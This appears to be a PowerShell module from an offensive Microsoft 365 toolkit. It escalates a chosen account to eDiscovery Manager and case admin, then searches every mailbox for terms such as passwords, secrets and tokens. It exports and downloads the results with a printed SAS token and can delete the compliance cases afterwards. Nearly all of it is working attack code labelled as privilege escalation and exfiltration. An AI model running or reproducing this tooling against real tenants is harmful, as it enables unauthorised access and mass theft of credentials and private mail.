#Compliance & Security Functions
function Display_E_Discovery_Cases ($selection = $false) {
    #param ($selection = $false)
    $all_e_discovery_cases = Get-ComplianceCase
    Write-Host ""

    if ($null -eq $all_e_discovery_cases){
        Write-Host "[x] No eDiscovery cases found" -ForegroundColor Red
        return
    }

    Write-Host "[*] eDiscovery cases found in the environment:" -ForegroundColor Gray
    foreach ($item in $all_e_discovery_cases){
        Write-Host $([array]::IndexOf($all_e_discovery_cases,$item)+1) ':' $item.Name
    } 

    while ($selection) {
        try {
            [int]$case_choice = Read-Host "`n[?] Select a case from the list you would like to explore"
            Write-Host ""
            $global:selected_case = $all_e_discovery_cases[$case_choice-1].Name
            break
        }
        catch {
            Write-Host "[x] Choose an option number from the list" -ForegroundColor Red
        }   
    }
}

function Display_E_Discovery_Case_Searches ($selection = $false, $case_name) {
    $all_case_searches = Get-ComplianceSearch -Case $case_name

    Write-Host "[*] $($all_case_searches.Count) searches found in case -> $case_name" -ForegroundColor Gray
    if ($all_case_searches -is [array]) {
        foreach ($item in $all_case_searches){
            Write-Host $([array]::IndexOf($all_case_searches,$item)+1) ':' $item.Name
        }
    }
    else {
        $selection = $false
        $global:selected_search = $all_case_searches.Name
        Write-Host $global:selected_search
    }

    while ($selection) {
        try {
            [int]$search_choice = Read-Host -Prompt "`n[?] Select a search from the list you would like to explore"
            Write-Host ""
            $global:selected_search = $all_case_searches[$search_choice-1].Name
            break
        }
        catch {
            Write-Host "[x] Choose an option number from the list" -ForegroundColor Red
        }   
    }
}

function E_Discovery_Downloader ($case_name, $export_name){

    $export_tool = ((Get-ChildItem -Path $($env:LOCALAPPDATA + "\Apps\2.0\") -Filter microsoft.office.client.discovery.unifiedexporttool.exe -Recurse).FullName | Where-Object{ $_ -notmatch "_none_" } | Select-Object -First 1)    
    $export_location = ".\Outputs\"
    
    ##Export Details
    $export_details = Get-ComplianceSearchAction -Case $case_name -Identity $export_name -IncludeCredential -Details
    $export_details = $export_details.Results.split(";")
    $container_url = $export_details[0].trimStart("Container url: ")
    $sas_token = $export_details[1].trimStart(" SAS token: ")

    Write-Host "`n#######################################################################################" -ForegroundColor Gray
    Write-Host "Download URL: $container_url" -ForegroundColor Gray
    Write-Host "Download Key: $sas_token" -ForegroundColor Gray
    Write-Host "#######################################################################################`n" -ForegroundColor Gray

    #Download the exported file from M365
    Write-Host "[*] Initiating download of export" -ForegroundColor Gray
    Write-Host "[*] Saving export to:" $export_location -ForegroundColor Gray
    
    #Start-Process -FilePath $export_tool -ArgumentList $Arguments
    & $export_tool -name $export_name -source $container_url -key $sas_token -dest $export_location -trace true

    Write-Host "[+] Download completed" -ForegroundColor Yellow
}

function E_Discovery_Priv_Esc {

    EnterAccount "[?] Enter an account to escalate privileges to eDiscovery manager (user@org.com)"
    $target_account = $global:account_username

    $role_members = Get-RoleGroupMember "eDiscovery Manager"
    $admin_role_members = Get-eDiscoveryCaseAdmin

    #Check eDiscovery Admin 
    if ((Get-AzureADUser -ObjectId $target_account).DisplayName -notin $admin_role_members.Name){

        ###Not eDiscovery Manager
        if ((Get-AzureADUser -ObjectId $target_account).DisplayName -notin $role_members.Name){ 
            #Escalate to Manager
            try {
                Write-Host "[*] Attempting privilege escalation to eDiscovery Manager role" -ForegroundColor Gray
                Add-RoleGroupMember -Identity "eDiscovery Manager" -Member $target_account -ErrorAction Stop
                Write-Host "[+] Elevated privileges to eDiscovery Manager role" -ForegroundColor Yellow
                Write-Host "[*] Waiting for changes to take effect" -ForegroundColor Gray
                Start-Sleep -Seconds 30
            }
            catch {
                Write-Host "[x] Failed privilege escalation to eDiscovery Manager" -ForegroundColor Red
                break
            }
        }
        
        ###Escalate to eDiscovery Admin
        try {
            Write-Host "[*] Attempting privilege escalation to eDiscovery Administrator" -ForegroundColor Gray
            Add-eDiscoveryCaseAdmin -User $target_account
            Write-Host "[+] You are now eDiscovery Admin" -ForegroundColor Yellow
            Write-Host "[*] Waiting for changes to take effect" -ForegroundColor Gray
            Start-Sleep -Seconds 30
        }
        catch {
            Write-Host "[x] Failed privilege escalation to eDiscovery Admin" -ForegroundColor Red
            break
        }
    }
    else {
        Write-Host "`n[*] Sometimes life isn't that hard ;)" -ForegroundColor Gray
        Write-Host "`n[*] User is already eDiscovery Admin & eDiscovery Manager" -ForegroundColor Gray
        return
    }
}

#Create a new search and export data
function Create_New_Search {
    Write-Host "Create new search in: `n1. New Case `n2. Existing Case"
    $new_search_choice = Read-Host -Prompt "`n[?] Select an option"

    if ($new_search_choice -eq 1) {
        $case_name = Read-Host -Prompt "`n[?] Enter a name for your new eDiscovery case"
        $description = "$case_name"
        ##  Create case
        Write-Host "`n[*] Creating new compliance case: $case_name" -ForegroundColor Gray
        New-ComplianceCase -Name $case_name -Description $description
    }

    if ($new_search_choice -eq 2) {
        Display_E_Discovery_Cases $true
        $case_name = $selected_case
    }

    $search_name = Read-Host "`n[?] Enter a name for the new search"
    Write-Host ""
    $export_location = ".\Outputs\"

    #Query to use for eDiscovery
    Write-Host "`n[i] Example: pass* or secret or CEO or credentials or token" -ForegroundColor Cyan
    $searchQry = Read-Host -Prompt "`n[?] Enter a term or multiple search terms separeted by 'or' for e-discovery search"
    Write-Host ""
    Write-Host "`n[*] Searching for terms: $searchQry" -ForegroundColor Gray
    Start-Sleep -Seconds 3

    ##  Initiate Search query
    $compSearch = New-ComplianceSearch -Case $case_name -Name $search_name -ExchangeLocation all -ContentMatchQuery $searchQry

    ##  Start Actual search
    Write-Host "[*] Initiating search" -ForegroundColor Gray
    try {
        Start-ComplianceSearch -Identity $search_name -ErrorAction Stop
    }
    catch {
        Write-Host "[x] Failed to start compliance search" -ForegroundColor Red
        break
    }
    
    do
        {
            Start-Sleep -s 5
            $complianceSearch = Get-ComplianceSearch -Identity $search_name
        }
    while ($complianceSearch.Status -ne 'Completed')
    Write-Host "[+] Compliance Search completed" -ForegroundColor Yellow 

    Read-Host "`n[?] Press enter to see details of the compliance search result"
    Write-Host ""
    Get-ComplianceSearch -Identity $search_name | Format-List
}

function Install_Unified_Export_Tool {
    
    ###This unified export tool installer module is thanks to Dale O'Grady's script for attack lab and is essentially a copy of that###
    ##Check if microsoft.office.client.discovery.unifiedexporttool.exe tool is already installed. Install it otherwise
    While (-Not ((Get-ChildItem -Path $($env:LOCALAPPDATA + "\Apps\2.0\") -Filter microsoft.office.client.discovery.unifiedexporttool.exe -Recurse).FullName | Where-Object{ $_ -notmatch "_none_" } | Select-Object -First 1)){
        Write-Host "Downloading Unified Export Tool ."
        Write-Host "This is installed per-user by the Click-Once installer."

        # Credit to Jos Verlinde for his code in Load-ExchangeMFA in the Powershell Gallery!
        # https://www.powershellgallery.com/packages/Load-ExchangeMFA/1.2

        $Manifest = "https://complianceclientsdf.blob.core.windows.net/v16/Microsoft.Office.Client.Discovery.UnifiedExportTool.application"
        $ElevatePermissions = $true
        Try {
            Add-Type -AssemblyName System.Deployment
            Write-Host "[*] Starting installation of ClickOnce Application $Manifest " -ForegroundColor Gray
            $RemoteURI = [URI]::New( $Manifest , [UriKind]::Absolute)
            if (-not  $Manifest){
                throw "Invalid ConnectionUri parameter '$ConnectionUri'"
            }
            $HostingManager = New-Object System.Deployment.Application.InPlaceHostingManager -ArgumentList $RemoteURI , $False
            Register-ObjectEvent -InputObject $HostingManager -EventName GetManifestCompleted -Action { 
                new-event -SourceIdentifier "ManifestDownloadComplete"
            } | Out-Null
            Register-ObjectEvent -InputObject $HostingManager -EventName DownloadApplicationCompleted -Action { 
                new-event -SourceIdentifier "DownloadApplicationCompleted"
            } | Out-Null
            $HostingManager.GetManifestAsync()
            $check_event = Wait-Event -SourceIdentifier "ManifestDownloadComplete" -Timeout 15
            if ($check_event ) {
                $check_event | Remove-Event
                Write-Host "[*] ClickOnce Manifest Download Completed" -ForegroundColor Gray
                $HostingManager.AssertApplicationRequirements($ElevatePermissions)
                $HostingManager.DownloadApplicationAsync()
                $check_event = Wait-Event -SourceIdentifier "DownloadApplicationCompleted" -Timeout 60
                if ($check_event ) {
                    $check_event | Remove-Event
                    Write-Host "`[+] ClickOnce application download completed" -ForegroundColor Yellow
                }
                else {
                    Write-error "ClickOnce Application Download did not complete in time (60s)"
                }
            }
            else {
                Write-error "ClickOnce Manifest Download did not complete in time (15s)"
            }
        }
        finally {
            Get-EventSubscriber|? {$_.SourceObject.ToString() -eq 'System.Deployment.Application.InPlaceHostingManager'} | Unregister-Event
        }
    }
    Write-Host "[+] Unified Export tool already installed" -ForegroundColor Yellow
}

function EDiscoveryExfil {
    #Export and Download a Search"
    Display_E_Discovery_Cases $true
    
    if ($null -ne $global:selected_case){   
        Display_E_Discovery_Case_Searches $true $global:selected_case
        $export_name = $global:selected_search + "_Export"

        if ($global:selected_search -notin "",$null){
            try {
                Write-Host "[*] Creating new compliance search action" -ForegroundColor Gray
                New-ComplianceSearchAction -SearchName $global:selected_search -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -Confirm:$false -ErrorAction Stop
                #Check and wait for SearchAction to complete
                do
                    {
                        Start-Sleep -s 5
                        $complianceSearchAction = Get-ComplianceSearchAction -Case $global:selected_case -Identity $export_name -IncludeCredential -Details
                    }
                while ($complianceSearchAction.Status -ne 'Completed')

                #Start download
                E_Discovery_Downloader $global:selected_case $export_name
                break
            }
            catch {
                Write-Host "[x] Failed to export the search" -ForegroundColor Red
                Write-Host "[*] Attempting to re-run selected search" -ForegroundColor Gray
                Start-ComplianceSearch -Identity $global:selected_search
                do
                    {
                        Start-Sleep -s 5
                        $complianceSearch = Get-ComplianceSearch -Identity $global:selected_search
                    }
                while ($complianceSearch.Status -ne 'Completed')
                Write-Host "[*] Search re-run completed" -ForegroundColor Gray  
            }
        
            try {
                Write-Host "[*] Creating new compliance search action" -ForegroundColor Gray
                New-ComplianceSearchAction -SearchName $global:selected_search -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -Confirm:$false -ErrorAction Stop
                #Check and wait for SearchAction to complete
                do
                    {
                        Start-Sleep -s 5
                        $complianceSearchAction = Get-ComplianceSearchAction -Case $global:selected_case -Identity $export_name -IncludeCredential -Details
                    }
                while ($complianceSearchAction.Status -ne 'Completed')
                Write-Host "[*] Compliance search action completed" -ForegroundColor Gray
                #Start download
                E_Discovery_Downloader $global:selected_case $export_name
            }
            catch {
                Write-Host "[x] Failed to export search" -ForegroundColor Red
            }
        }
        else {
            Write-Host "[x] No search available in selected case to export (Try another case)" -ForegroundColor Red
        }
    }
    Pause
}

function DeleteComplianceCase {
    Display_E_Discovery_Cases $true

    if ($null -ne $global:selected_case){
        try {
            Write-Host "[*] Deleting compliance case $global:selected_case" -ForegroundColor Gray
            Remove-ComplianceCase -Identity $global:selected_case -Confirm:$false
            Write-Host "[+] Successfully deleted compliance case"
        }
        catch {
            Write-Host "[x] Failed to delete compliance case" -ForegroundColor Red
        }   
    }
}